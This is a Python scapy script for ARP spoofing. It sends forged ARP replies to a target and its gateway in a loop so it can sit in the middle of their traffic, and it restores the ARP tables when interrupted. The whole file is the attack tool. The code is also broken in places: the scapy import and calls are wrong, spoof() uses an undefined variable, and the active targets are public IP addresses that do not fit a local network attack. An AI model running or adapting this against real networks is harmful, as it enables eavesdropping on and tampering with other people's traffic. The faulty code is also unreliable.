#!/usr/bin/env python

import scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy(op=2, pdst=target, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, srce_ip):
    dest_mac = get_mac(dest_ip)
    srce_mac = get_mac(srce_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=srce_ip)
    scapy.send(packet, count=50, verbose=False)


target_ip = "151.101.192.205"
gateway_ip = "151.101.0.205"

#target_ip = "10.0.2.5"
#gateway_ip = "10.0.2.1"
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[^_^] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n---> Shutdown signal recieved.... \n ---> Quitting.... ")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# print(packet.show())
# print(packet.summary())
